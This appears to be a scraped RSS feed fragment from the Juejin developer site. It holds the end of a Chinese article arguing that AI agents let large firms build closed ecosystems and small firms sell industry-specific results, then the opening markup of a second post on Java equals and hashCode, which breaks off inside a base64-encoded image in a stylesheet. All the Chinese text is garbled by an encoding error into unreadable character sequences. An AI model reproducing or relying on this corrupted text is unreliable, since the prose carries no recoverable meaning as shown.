<p>æ‰€ä»¥ï¼Œå¤§å‚ä»¬çš„Agentå¸ƒå±€ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨äº‰å¤ºâ€œæ™ºèƒ½æ—¶ä»£çš„è§„åˆ™åˆ¶å®šæƒâ€ã€‚å®ƒä»¬è¦é€šè¿‡Agentï¼ŒæŠŠè‡ªå·±çš„äº‘æœåŠ¡ã€åŠå…¬è½¯ä»¶ã€å¨±ä¹å†…å®¹ã€ç¡¬ä»¶è®¾å¤‡ï¼ˆæ¯”å¦‚æ‰‹æœºã€ç”µè„‘ã€æ™ºèƒ½æ±½è½¦ï¼‰æ·±åº¦ç»‘å®šï¼Œæ„å»ºä¸€ä¸ªâ€œç”¨æˆ·è¿›æ¥å°±ç¦»ä¸å¼€â€çš„é—­ç¯ç”Ÿæ€ã€‚æ¯”å¦‚å¾®è½¯çš„Copilotï¼Œå·²ç»æ·±åº¦é›†æˆäº†Officeã€Azureäº‘ã€Teamsç­‰äº§å“ï¼›å­—èŠ‚è·³åŠ¨çš„Agentï¼Œæ­£åœ¨å¯¹æ¥æŠ–éŸ³ã€ä»Šæ—¥å¤´æ¡ã€é£ä¹¦ç­‰ç”Ÿæ€ã€‚ä¸€æ—¦è¿™ä¸ªç”Ÿæ€å»ºæˆï¼ŒæŠ€æœ¯ä¼˜åŠ¿å°±ä¼šå˜æˆæŒä¹…çš„å•†ä¸šæŠ¤åŸæ²³ã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€å°å‚çš„ç ´å±€ï¼šä»â€œå–å·¥å…·â€åˆ°â€œå–ç»“æœâ€çš„ç”Ÿæ­»è·ƒè¿</h2>
<p>å¾ˆå¤šäººè§‰å¾—ï¼ŒAgentæ˜¯å¤§å‚çš„æ¸¸æˆï¼Œå°å…¬å¸æ ¹æœ¬ç©ä¸èµ·ã€‚ä½†äº‹å®æ°æ°ç›¸åâ€”â€”AgentæŠ€æœ¯ï¼Œåè€Œç»™äº†ä¸­å°ä¼ä¸šå’Œåˆ›ä¸šå…¬å¸ä¸€æ¬¡â€œå˜é“è¶…è½¦â€çš„æœºä¼šã€‚</p>
<p>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºåœ¨é€šç”¨å¤§æ¨¡å‹çš„åŸºç¡€èƒ½åŠ›ä¸Šï¼Œå°å‚ç¡®å®æ²¡ä¼˜åŠ¿â€”â€”ä½ ä¸å¯èƒ½æ¯”å¾®è½¯ã€è°·æ­Œæ›´æœ‰é’±è®­ç»ƒåƒäº¿å‚æ•°çš„å¤§æ¨¡å‹ã€‚ä½†AgentæŠ€æœ¯æŠŠç«äº‰ç»´åº¦ä»â€œæ¨¡å‹å¤§å°â€è½¬å‘äº†â€œåœºæ™¯æ·±åº¦â€ï¼Œè€Œè¿™æ­£æ˜¯å°å‚çš„æ ¸å¿ƒä¼˜åŠ¿ã€‚</p>
<p>Agentç»™å°å‚å¸¦æ¥äº†ä¸¤ä¸ªæ ¹æœ¬æ€§çš„æ”¹å˜ï¼Œä¹Ÿæ˜¯å®ƒä»¬çš„ç ´å±€å…³é”®ï¼š</p>
<p>ç¬¬ä¸€ï¼Œä»·å€¼äº¤ä»˜æ¨¡å¼ä»â€œå–å·¥å…·â€å‡çº§ä¸ºâ€œå–ç»“æœâ€ã€‚ä¼ ç»Ÿçš„è½¯ä»¶å…¬å¸ï¼Œæ¯”å¦‚åšCRMç³»ç»Ÿçš„ï¼Œå–ç»™å®¢æˆ·çš„æ˜¯ä¸€å¥—â€œå·¥å…·â€â€”â€”å®¢æˆ·éœ€è¦è‡ªå·±é…ç½®æµç¨‹ã€åŸ¹è®­å‘˜å·¥ä½¿ç”¨ï¼Œæœ€åèƒ½ä¸èƒ½å‡ºæ•ˆæœï¼Œå…¨çœ‹å®¢æˆ·çš„ä½¿ç”¨èƒ½åŠ›ã€‚ä½†åŸºäºAgentçš„è§£å†³æ–¹æ¡ˆï¼Œå–ç»™å®¢æˆ·çš„æ˜¯â€œä¸šåŠ¡ç»“æœâ€ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªä¸ºè·¨å¢ƒç”µå•†åšçš„Agentï¼Œå®¢æˆ·ä¹°çš„ä¸æ˜¯â€œä¸€å¥—ç®¡ç†è½¯ä»¶â€ï¼Œè€Œæ˜¯â€œè‡ªåŠ¨å®Œæˆé€‰å“ã€ä¸Šæ¶ã€å®¢æœè·Ÿè¿›ã€æ•°æ®åˆ†æçš„å®Œæ•´è¿è¥æœåŠ¡â€ï¼›ä¸€ä¸ªä¸ºå¾‹å¸ˆäº‹åŠ¡æ‰€åšçš„Agentï¼Œå®¢æˆ·ä¹°çš„ä¸æ˜¯â€œä¸€å¥—æ³•è§„æŸ¥è¯¢å·¥å…·â€ï¼Œè€Œæ˜¯â€œè‡ªåŠ¨å®¡æ ¸åˆåŒé£é™©ã€ç”Ÿæˆæ³•å¾‹æ„è§ä¹¦çš„ä¸“ä¸šæœåŠ¡â€ã€‚å®¢æˆ·ä¸ç”¨å†æ“å¿ƒâ€œæ€ä¹ˆç”¨â€ï¼Œåªéœ€è¦ä¸ºâ€œæœ€ç»ˆæ•ˆæœâ€ä»˜è´¹ï¼Œè¿™ä¸ä»…å¤§å¤§æå‡äº†äº§å“ç²˜æ€§ï¼Œè¿˜æ‹‰é«˜äº†ä»·å€¼å¤©èŠ±æ¿â€”â€”æ¯•ç«Ÿâ€œç»“æœâ€çš„ä»·å€¼ï¼Œè¿œæ¯”â€œå·¥å…·â€é«˜å¾—å¤šã€‚</p>
<p>ç¬¬äºŒï¼Œæ ¸å¿ƒç«äº‰åŠ›ä»â€œæŠ€æœ¯èƒ½åŠ›â€è½¬å‘â€œè¡Œä¸šè®¤çŸ¥â€ã€‚å°å…¬å¸çš„ä¼˜åŠ¿ï¼Œä»æ¥ä¸æ˜¯é€šç”¨æŠ€æœ¯ï¼Œè€Œæ˜¯å¯¹æŸä¸ªå‚ç›´è¡Œä¸šçš„æ·±åˆ»ç†è§£å’Œç§æœ‰æ•°æ®ç§¯ç´¯ã€‚æ¯”å¦‚ï¼š</p>
<ul>
<li>è·¨å¢ƒç”µå•†Agentï¼šèƒ½æ·±åº¦ç†è§£äºšé©¬é€Šã€Shopeeç­‰å¹³å°çš„è§„åˆ™ï¼ŒçŸ¥é“æ€ä¹ˆé€‰å“èƒ½é¿å¼€ä¾µæƒã€æ€ä¹ˆä¼˜åŒ–Listingèƒ½æé«˜æ›å…‰ï¼Œè¿˜èƒ½å¯¹æ¥ç‰©æµç³»ç»Ÿå®æ—¶è·Ÿè¸ªè´§ç‰©çŠ¶æ€ã€‚è¿™äº›è¡Œä¸šç»†èŠ‚ï¼Œå¤§å‚çš„é€šç”¨Agentæ ¹æœ¬è¦†ç›–ä¸åˆ°ã€‚</li>
<li>åŒ»ç–—Agentï¼šèƒ½ç»“åˆæŸå®¶åŒ»é™¢çš„ç—…å†æ•°æ®ã€ç§‘å®¤æµç¨‹ï¼Œè‡ªåŠ¨å¸®åŒ»ç”Ÿæ•´ç†ç—…å†ã€å¼€å…·æ£€æŸ¥å•ï¼Œç”šè‡³æé†’æ‚£è€…å¤è¯Šã€‚è¿™äº›åŸºäºç‰¹å®šæœºæ„çš„æ•°æ®å’Œæµç¨‹ï¼Œå¤§å‚å¾ˆéš¾è·å–ã€‚</li>
<li>åˆ¶é€ Agentï¼šèƒ½å¯¹æ¥å·¥å‚çš„ç”Ÿäº§è®¾å¤‡æ•°æ®ï¼Œå®æ—¶ç›‘æ§ç”Ÿäº§è¿›åº¦ï¼Œé¢„æµ‹è®¾å¤‡æ•…éšœï¼Œè¿˜èƒ½è‡ªåŠ¨ç”Ÿæˆç”Ÿäº§æŠ¥å‘Šã€‚è¿™äº›å·¥ä¸šåœºæ™¯çš„ä¸“ä¸šçŸ¥è¯†ï¼Œæ˜¯é€šç”¨Agentä¸å…·å¤‡çš„ã€‚</li>
</ul>
<p>å¯¹å°å‚æ¥è¯´ï¼ŒAgentä¸æ˜¯â€œè¿½èµ¶å¤§å‚çš„è´Ÿæ‹…â€ï¼Œè€Œæ˜¯â€œæŠŠè¡Œä¸šçŸ¥è¯†äº§å“åŒ–â€çš„è½½ä½“ã€‚é€šè¿‡Agentï¼Œå°å‚å¯ä»¥æŠŠè‡ªå·±å¤šå¹´ç§¯ç´¯çš„è¡Œä¸šç»éªŒï¼Œå˜æˆä¸€å¥—è‡ªåŠ¨åŒ–çš„è§£å†³æ–¹æ¡ˆï¼Œä»â€œå–æŠ€æœ¯â€çš„ä¹™æ–¹ï¼Œå˜æˆâ€œæä¾›ç»“æœâ€çš„åˆä½œä¼™ä¼´ã€‚è¿™æ˜¯å°å‚åœ¨AIæ—¶ä»£ç«‹è¶³çš„å…³é”®ã€‚</p>
<h2 data-id="heading-3">å››ã€ç»“è¯­ï¼šæ™ºèƒ½ä½“ç»æµï¼Œæ‰åˆšåˆšæ‹‰å¼€åºå¹•</h2>
<p>æœ€åæƒ³è¯´ï¼ŒAI Agentçš„çƒ­æ½®ï¼Œä¸æ˜¯åˆä¸€è½®æ¦‚å¿µç‚’ä½œï¼Œè€Œæ˜¯æŠ€æœ¯æ¼”è¿›å’Œå•†ä¸šé€»è¾‘å…±åŒä½œç”¨çš„å¿…ç„¶ç»“æœã€‚å®ƒæ ‡å¿—ç€AIä»â€œè¾…åŠ©æ€è€ƒâ€èµ°å‘â€œæ›¿ä»£æ‰§è¡Œâ€ï¼Œä»â€œä¿¡æ¯æœåŠ¡â€èµ°å‘â€œç”Ÿäº§åŠ›å·¥å…·â€ï¼Œæ•´ä¸ªAIè¡Œä¸šçš„ä»·å€¼åˆ›é€ æ–¹å¼ï¼Œæ­£åœ¨å‘ç”Ÿç»“æ„æ€§è½¬å˜ã€‚</p>
<p>å½“ç„¶ï¼Œç°åœ¨çš„Agentè¿˜é¢ä¸´å¾ˆå¤šé—®é¢˜ï¼šç¨³å®šæ€§ä¸å¤Ÿï¼ˆæ¯”å¦‚æ‹†è§£ä»»åŠ¡æ—¶ä¼šå‡ºé”™ï¼‰ã€æˆæœ¬å¤ªé«˜ï¼ˆè°ƒç”¨APIå’Œå¤§æ¨¡å‹çš„è´¹ç”¨ä¸ä½ï¼‰ã€ä¿¡ä»»åº¦ä¸è¶³ï¼ˆç”¨æˆ·ä¸æ•¢è®©å®ƒå¤„ç†æ•æ„Ÿä»»åŠ¡ï¼‰ã€‚ä½†è¿™äº›éƒ½æ˜¯æŠ€æœ¯å‘å±•åˆæœŸçš„æ­£å¸¸ç°è±¡ï¼Œå°±åƒå½“å¹´çš„ç§»åŠ¨äº’è”ç½‘ï¼Œæ—©æœŸçš„Appä¹Ÿå¾ˆç®€é™‹ï¼Œä½†å¹¶ä¸å¦¨ç¢å®ƒé¢ è¦†æ•´ä¸ªè¡Œä¸šã€‚</p>
<p>æœªæ¥çš„å•†ä¸šæ ¼å±€ï¼Œä¸å†æ˜¯â€œAppä¹‹é—´çš„ç«äº‰â€ï¼Œè€Œæ˜¯â€œç”Ÿæ€ä¸ç”Ÿæ€çš„ç«äº‰â€ï¼Œæ˜¯â€œé€šç”¨Agentä¸å‚ç›´Agentçš„åä½œä¸åšå¼ˆâ€ã€‚å¤§å‚æŒæ§é€šç”¨å…¥å£ï¼Œå°å‚æ·±è€•å‚ç›´åœºæ™¯ï¼Œæœ€ç»ˆå½¢æˆä¸€ä¸ªâ€œæ™ºèƒ½ä¸­æ¢+ç»†åˆ†æœåŠ¡â€çš„å…¨æ–°ç”Ÿæ€ã€‚</p>
<p>è¿™åœºå…³äºâ€œè¡ŒåŠ¨æ™ºèƒ½â€çš„çªå›´æˆ˜ï¼Œå·²ç»æ‰“å“ã€‚å®ƒæ— å…³ä¹â€œæˆ‘ä»¬æ˜¯å¦éœ€è¦AIâ€ï¼Œè€Œå…³ä¹â€œæˆ‘ä»¬å¦‚ä½•è®©AIæ›´å¥½åœ°ä¸ºæˆ‘ä»¬åšäº‹â€ã€‚å¯¹ä¼ä¸šæ¥è¯´ï¼Œç°åœ¨å¸ƒå±€Agentï¼Œä¸æ˜¯â€œé€‰ä¸é€‰â€çš„é—®é¢˜ï¼Œè€Œæ˜¯â€œæ€ä¹ˆé€‰â€çš„é—®é¢˜â€”â€”æ˜¯è·Ÿç€å¤§å‚åšç”Ÿæ€ï¼Œè¿˜æ˜¯æ‰è¿›å‚ç›´é¢†åŸŸåšæ·±åº¦ï¼Ÿæ¬¢è¿åœ¨è¯„è®ºåŒºèŠèŠä½ çš„çœ‹æ³•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€é¢è¯•å¤ç›˜ã€‘æœ‰äº†equalsä¸ºä»€ä¹ˆè¿˜è¦hashcode]]></title>    <link>https://juejin.cn/post/7595147176752840704</link>    <guid>https://juejin.cn/post/7595147176752840704</guid>    <pubDate>2026-01-15T08:09:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595147176752840704" data-draft-id="7595131688940126248" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€é¢è¯•å¤ç›˜ã€‘æœ‰äº†equalsä¸ºä»€ä¹ˆè¿˜è¦hashcode"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-15T08:09:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="omenkk7"/> <meta itemprop="url" content="https://juejin.cn/user/933901076016858"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€é¢è¯•å¤ç›˜ã€‘æœ‰äº†equalsä¸ºä»€ä¹ˆè¿˜è¦hashcode
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933901076016858/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    omenkk7
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:09:58.000Z" title="Thu Jan 15 2026 08:09:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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